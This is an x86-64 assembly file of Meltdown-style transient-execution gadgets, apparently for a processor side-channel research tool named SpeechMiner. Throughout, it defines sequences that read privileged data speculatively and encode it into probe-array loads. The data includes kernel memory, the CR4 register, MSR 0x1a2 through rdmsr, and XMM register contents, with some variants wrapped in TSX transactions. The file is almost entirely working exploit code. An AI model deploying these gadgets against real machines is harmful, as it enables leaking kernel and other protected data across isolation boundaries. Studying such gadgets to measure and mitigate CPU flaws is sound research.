# Code sequences to be selected by SpeechMiner

# ---------------------------------------------------------------------------
# Standard code sequence
	.text
	.global meltdown_depth_begin
	.global meltdown_depth_end
	.type meltdown_depth_begin, @function
meltdown_depth_begin:
	sub %rbx, %rcx
	sub $64, %rbx
	movq (%rbx), %rdi
	movq (%rdi, %rcx, 1), %rcx
	movq (%rdi, %rcx, 1), %rcx
	add $1, %rcx
	sub $1, %rcx
	add $1, %rcx
	sub $1, %rcx
	add $1, %rcx
	sub $1, %rcx
	add $1, %rcx
	sub $1, %rcx
	add $1, %rcx
	sub $1, %rcx
meltdown_depth_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_write_begin
	.global meltdown_write_end
	.type meltdown_write_begin, @function
meltdown_write_begin:
	mov %rbx, %rdi
	sub $64, %rdi
	movq (%rdi), %rdi
	movq $0x42000, (%rcx)
	movq (%rcx), %rcx
	movq (%rbx, %rcx, 1), %rcx
meltdown_write_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_cr_begin
	.global meltdown_cr_end
	.type meltdown_cr_begin, @function
meltdown_cr_begin:
	movq %rbx, %rdi
	sub $64, %rdi
	movq (%rdi), %rdi
	movq %cr4, %r8
	and $0xff, %r8
	shl $12, %r8
	movq (%rbx, %r8, 1), %r8
meltdown_cr_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_msr_begin
	.global meltdown_msr_end
	.type meltdown_msr_begin, @function
meltdown_msr_begin:
	movq %rbx, %rdi
	sub $64, %rbx
	movq $0x1a2, %rcx
	movq (%rbx), %rbx
	rdmsr
	and $0xff0000, %rax
	shr $4, %rax
	movq (%rdi, %rax, 1), %rax
meltdown_msr_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_xmm_begin
	.global meltdown_xmm_end
	.type meltdown_xmm_begin, @function
meltdown_xmm_begin:
	movq %rcx, %rsi
	movq %rbx, %rdi
	sub %rdi, %rsi
	sub $64, %rdi
	cpuid
	movq (%rdi), %rdi
	movdqa (%rsi, %rdi, 1), %xmm0
	movq %xmm0, %rax
	movq (%rdi,%rax,1), %rdi
meltdown_xmm_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_xmm_load_begin
	.global meltdown_xmm_load_end
	.type meltdown_xmm_load_begin, @function
meltdown_xmm_load_begin:
	movq %rbx, %rsi
	movq %rbx, %rdi
	sub $64, %rdi
	cpuid
	movq (%rdi), %rdi
	movq %xmm0, %rax
	movq (%rsi,%rax,1), %rsi
meltdown_xmm_load_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_xmm_wait_begin
	.global meltdown_xmm_wait_end
	.type meltdown_xmm_wait_begin, @function
meltdown_xmm_wait_begin:
	movq %rbx, %rsi
	movq %rbx, %rdi
	sub $64, %rdi
	cpuid
	movq (%rdi), %rdi
	wait
	movq %xmm0, %rax
	movq (%rsi,%rax,1), %rsi
meltdown_xmm_wait_end:
	nop

# ---------------------------------------------------------------------------
	.global meltdown_depth_with_tsx_begin
	.global meltdown_depth_with_tsx_end
	.type meltdown_depth_with_tsx_begin, @function
meltdown_depth_with_tsx_begin:
	xbegin end_execution
	sub %rbx, %rcx
	sub $64, %rbx
	movq (%rbx), %rdi
	movq (%rdi, %rcx, 1), %rcx
	movq (%rdi, %rcx, 1), %rcx
	xend
	end_execution:
	nop
meltdown_depth_with_tsx_end:
	nop



# ---------------------------------------------------------------------------
	.global branch_meltdown_standard_begin
	.global branch_meltdown_standard_end
	.type branch_meltdown_standard_begin, @function
branch_meltdown_standard_begin:
	movq (%r11), %r11
	movq (%r10, %r11, 1), %r11
branch_meltdown_standard_end:
	add $1, %r11
	sub $1, %r11
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_cr_begin
	.global branch_meltdown_cr_end
	.type branch_meltdown_cr_begin, @function
branch_meltdown_cr_begin:
	movq %cr4, %r11
	and $0xff, %r11
	shl $12, %r11
	movq (%r10, %r11, 1), %r11
branch_meltdown_cr_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_msr_begin
	.global branch_meltdown_msr_end
	.type branch_meltdown_msr_begin, @function
branch_meltdown_msr_begin:
	movq $0x1a2, %rcx
	rdmsr
	and $0xff0000, %rax
	shr $4, %rax
	movq %rax, %r11
	movq (%r10, %r11, 1), %r11
branch_meltdown_msr_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_xmm_load_begin
	.global branch_meltdown_xmm_load_end
	.type branch_meltdown_xmm_load_begin, @function
branch_meltdown_xmm_load_begin:
	movq %xmm0, %r11
	movq (%r10,%r11,1), %r11
branch_meltdown_xmm_load_end:
	nop

# ---------------------------------------------------------------------------
	.global branch_meltdown_xmm_wait_begin
	.global branch_meltdown_xmm_wait_end
	.type branch_meltdown_xmm_wait_begin, @function
branch_meltdown_xmm_wait_begin:
	wait
	movq %xmm0, %r11
	movq (%r10,%r11,1), %r11
branch_meltdown_xmm_wait_end:
	nop